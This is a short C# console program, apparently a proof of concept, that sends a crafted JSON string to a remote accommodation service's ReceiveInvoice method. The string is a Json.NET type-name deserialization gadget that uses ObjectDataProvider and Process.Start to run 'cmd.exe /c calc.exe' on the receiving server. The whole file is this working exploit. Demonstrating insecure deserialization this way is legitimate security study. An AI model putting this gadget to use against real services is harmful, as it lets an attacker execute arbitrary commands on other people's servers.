using ExternalService.AccomodationServiceReference;

namespace ExternalService
{
	internal class Program
	{
		static void Main(string[] args)
		{

			IAccomodationService client = new AccomodationServiceClient();

			var maliciousJson = "{\r\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\r\n    'MethodName':'Start',\r\n    'MethodParameters':{\r\n        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\r\n        '$values':['cmd.exe','/c calc.exe']\r\n    },\r\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\r\n}";

			client.ReceiveInvoice(maliciousJson);
		}
	}
}
